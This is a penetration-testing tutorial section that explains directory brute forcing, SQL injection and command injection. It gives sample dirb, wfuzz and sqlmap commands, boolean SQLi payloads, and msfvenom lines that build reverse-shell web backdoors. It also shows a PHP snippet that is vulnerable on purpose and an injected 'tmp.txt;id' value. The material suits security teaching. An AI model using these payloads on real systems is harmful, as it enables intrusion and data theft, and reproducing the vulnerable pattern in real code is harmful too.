## Web / API Attacks
Web / API attacks are related with HTTP service. Attackers try to inject malicious commands, detect applications versions and discover useful contents such as left-over, backup and configuration files, etc.

OWASP is a great source for application security and they made a TOP 10 list to emphasize most common  attacks. [The OWASP Top 10](https://owasp.org/www-project-top-ten/) is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.

Some common attacks and explanations:

* __Directory Brute Force__ may reveal hidden content of the web service: default pages, application versions and backend files which are not intended to expose end users, etc. 

	dirb, dirbuster, gobuster, wfuzz, etc. tools can be used.

	Example code:
	```
	$ dirb http://URL/ PossibleFilesList.txt
	$ wfuzz -c file,PossibleFilesList.txt --hc 404 http://URL/FUZZ
	```

	The important part is in here:
    * These tools do not spider the target system and only check for files/folders in the parameter we provided (PossibleFilesList.txt). 
    * We still need to handle session cookies and tokens. Otherwise, the test will be performed over unauthenticated session, but it is still acceptable, because HTTP 403 may indicate the requested URL exists.
    * And we need to analysis out-come of the scan result and know common HTTP responses and the target system behavior:
        - __HTTP 200__: The file is accessible. (Successful response)
        - __HTTP 302__: The request may be redirected to login page. (Redirection messages)
        - __HTTP 403__: The page is not accessible due to lack of permission or authorization. (Content Forbidden)
        - __HTTP 404__: The file does not exist. (Content Not Found)
    
    These codes are common HTTP responses, but some web pages act in a different way. For example, if the requested URL does not exist, the service may reply with a 'HTTP 200' code and indicates the result with a notification text, instead of responding with a 'HTTP 404' code.
    
    Default pages, backup files and application versions can be very useful: 
    * Default pages may lead us to login pages, reveals common configurations and guessable user credentials.
    * Backup files may contain application credentials and other details. Attacker can restore it and see what is going on the application's backend.
    * Also application versions are important, because attackers can search for publicly known vulnerabilities. [Github](https://github.com), [Exploit-DB](https://www.exploit-db.com) and search engines are great sources for CVE records. Additionally, attackers can download same versions of the applications and simulate the target environment to find zero days. 

* A __SQL Injection Attack__ consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

  Some common SQLi control payloads:

  ```
  sql> select username,title,salary from UsersTable where userID = {id};
  
  http://URL?id=1337 or 1=1  -- 	//should always return True
  http://URL?id=1337 and 1=2 -- 	//should always return False
  ```

  Also 'sqlmap' can be very useful and time saver:

  ```
  $ sqlmap -u 'http://URL/?id=1337' -p 'id' --dbs --tables --columns
  ```
  If the 'id' param is vulnerable for SQLi attacks, 'sqlmap' performs various payloads to retrieve database tables, columns, contents, etc.
  

* __Command Injection__ is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

	It is a very serious attack vector because attacker can interact with target operating system directly and run arbitrary commands.
	
	There are a couple different ways to perform it:
	
    * __Uploading malicious files__: Attackers can upload malicious executable files to target system and call them over URL path.

		To create a backdoor, we can use Metasploit framework. Here is an example for 3 different web payloads:
	```
	$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx >reverse.aspx
	$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
	$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw> reverse.jsp
	```

	After uploading the files we create, we should set-up a local listener (meterpreter, ncat) for command prompt interaction.

	Please also note that, these files are executables and the target system may not accept them directly. So attackers can play with file extensions and HTTP content type to bypass restrictions.
	
    * __Modifying target system files__: Web service template files can be a good target. Attacker may modify email template, error pages, etc. and add malicious contents.
    * __Injecting commands__: Some application may require to run OS commands and it raises many concerns. The example below, the web page takes 'filename' parameter and remove the argument file from operating system. However, shell escape chars like '&, |, ;' may lead to execute '__$ rm tmp.txt;id__' commands all together. That means, the client can execute more commands than she/he is supposed to.
		```
		Http Call:
		  http://URL/removeFile.php?filename=tmp.txt;id
					
		removeFile.php content:
		<?php
		  print("Please specify the name of the file to delete");
		  print("<p>");
		  $file=$_GET['filename'];
		  system("rm $file");
		?>
		```

  All these commands will be run with the target service's privilege and that shows again the service accounts should run with minimum privileges to reduce attack surfaces.
